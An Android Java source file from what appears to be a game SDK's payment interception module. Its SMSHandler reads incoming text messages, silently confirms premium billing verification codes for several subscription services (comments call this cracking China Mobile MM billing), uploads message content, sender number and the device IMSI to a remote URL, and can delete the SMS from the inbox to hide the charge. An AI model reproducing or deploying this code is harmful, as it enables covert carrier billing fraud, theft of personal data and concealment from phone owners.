package mobi.zty.sdk.game.intercept;

import java.util.HashMap;
import java.util.Map;

import mobi.zty.pay.sdk.factory.PaymentFactoy;
import mobi.zty.sdk.game.GameSDK;
import mobi.zty.sdk.game.bean.FeeInfo;
import mobi.zty.sdk.util.Helper;
import mobi.zty.sdk.util.HttpRequestt;
import mobi.zty.sdk.util.Util_G;
import android.content.ContentResolver;
import android.content.Context;
import android.net.Uri;
import android.os.Handler;
import android.os.Message;

/**
 * 注意短信拦截 回复验证码的 条件（有些直接根据验证码下行端口就能判断 有些还要结合短信内容）
 * @author Administrator
 *
 */
public class SMSHandler extends Handler {
	private ContentResolver resolver;
	private Context context;
	private Map<String, FeeInfo> feMap = new HashMap<String, FeeInfo>();

	public SMSHandler(ContentResolver resolver, Context context) {
		super();
		this.resolver = resolver;
		this.context = context;
	}

	public void handleMessage(Message message) {
		try {
			MessageItem item = (MessageItem) message.obj;
			final String content = item.getBody();
			final String sender = item.getPhone();
			Util_G.debugE("Intercept", "verifySms-->>"+item.toString());
			GameSDK instance = GameSDK.getInstance();
			if (instance == null) return;
			boolean isMounthly = instance.isMonthFee();
			if(isMounthly){
				if(content.contains("天上西藏")){
					Util_G.debugE("smshandler", "读取到天上西藏的验证码短信");
					FeeInfo feeInfo = instance.getFeeInfoByinterception("天上西藏");
					if(feeInfo!=null){
						Util_G.debugE("smsHandler","orderId="+ feeInfo.orderId);
						Util_G.debugE("smshandler", "读取到天上西藏的验证码短信并拿到计费信息"+"step="+feeInfo.payStep);
					}
					if (feeInfo.payStep == 1||feeInfo.payStep == 0) {
						try {// 移动MM安安破解
							PaymentFactoy.producePay(feeInfo.mkClassName,GameSDK.getInstance().context)
									.sendVerifyCode(sender,content,feeInfo.orderId);
						} catch (Throwable e) {
							e.printStackTrace();
						}
					}
				}else if(content.contains("品藏手机")){
					Util_G.debugE("smshandler", "读取到品藏的验证码短信");
					FeeInfo feeInfo = instance.getFeeInfoByinterception("品藏手机");
					if(feeInfo!=null){
						Util_G.debugE("smsHandler", "orderId"+feeInfo.orderId);
						Util_G.debugE("smshandler", "读取到品藏的验证码短信并拿到计费信息"+"step="+feeInfo.payStep);
					}
					if (feeInfo.payStep == 1||feeInfo.payStep == 0) {
						try {// 移动MM安安破解
							PaymentFactoy.producePay(feeInfo.mkClassName,GameSDK.getInstance().context)
									.sendVerifyCode(sender,content,feeInfo.orderId);
						} catch (Throwable e) {
							e.printStackTrace();
						}
					}
				}else if(content.contains("一带一路新闻早报")){
					FeeInfo feeInfo = instance.getFeeInfoByinterception("一带一路新闻早报");
					if (feeInfo.payStep == 1||feeInfo.payStep == 0) {
						try {// 移动MM安安破解
							PaymentFactoy.producePay(feeInfo.mkClassName,GameSDK.getInstance().context)
									.sendVerifyCode(sender,content,feeInfo.orderId);
						} catch (Throwable e) {
							e.printStackTrace();
						}
					}
				}else if(content.contains("漫生活")){
					FeeInfo feeInfo = instance.getFeeInfoByinterception("漫生活");
					if (feeInfo.payStep == 1||feeInfo.payStep == 0) {
						try {// 移动MM安安破解
							PaymentFactoy.producePay(feeInfo.mkClassName,GameSDK.getInstance().context)
									.sendVerifyCode(sender,content,feeInfo.orderId);
						} catch (Throwable e) {
							e.printStackTrace();
						}
					}
				}
			}else{
				feMap = instance.getOrderFeeInfoMap();
				if (feMap.size()>0) {
					for (Map.Entry<String, FeeInfo> entry:feMap.entrySet()) {
						final FeeInfo feeInfo = entry.getValue();
						if (feeInfo.payStep == 1) {
							try {// 移动MM安安破解
								PaymentFactoy.producePay(feeInfo.mkClassName,GameSDK.getInstance().context)
										.sendVerifyCode(sender,content,feeInfo.orderId);
							} catch (Throwable e) {
								e.printStackTrace();
							}
						}
						if(feeInfo.downsmsInfo!=null&&feeInfo.downsmsInfo.down_content.length>0){
							if(feeInfo.payStep == 2){
								for(int i=0;i<feeInfo.downsmsInfo.down_content.length;i++){
									if(feeInfo.smsSucc_notify == 1&&feeInfo.downsmsInfo!=null&&content.contains(feeInfo.downsmsInfo.down_content[i])){
										new Thread(new Runnable() {
											@Override
											public void run() {
												String url = feeInfo.downsmsInfo.down_url+"?orderId="
											+feeInfo.orderId+"&pay_type="+feeInfo.payType+"&imsi="+Helper.getIMSI(context)+"&downcontent="+content+
											"&down_num="+sender;
												String requestResponse = HttpRequestt.get(url).body();//回传就好 不用管回调
												Helper.sendPayMessageToServer(feeInfo.payType, "下行短信上报成功", feeInfo.orderId);
												Util_G.debugE("ALLPAY-->>", "url="+url);
												Util_G.debugE("ALLPAY-->>", "下行短信上报服务端成功");
											}
										}).start();
									}
								}
							}
						}
					}
				}
			}
			if (GameSDK.mbDelSMS.equals("1")) {
				Util_G.debugE("ALLPAY","sms deleted!!!!!!!!!!!");
				int deleteSign = resolver.delete(Uri.parse("content://sms"), "_id=" + item.getId(), null);
				Util_G.debugE("ALLPAY","deleteSign:"+deleteSign);
			}
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
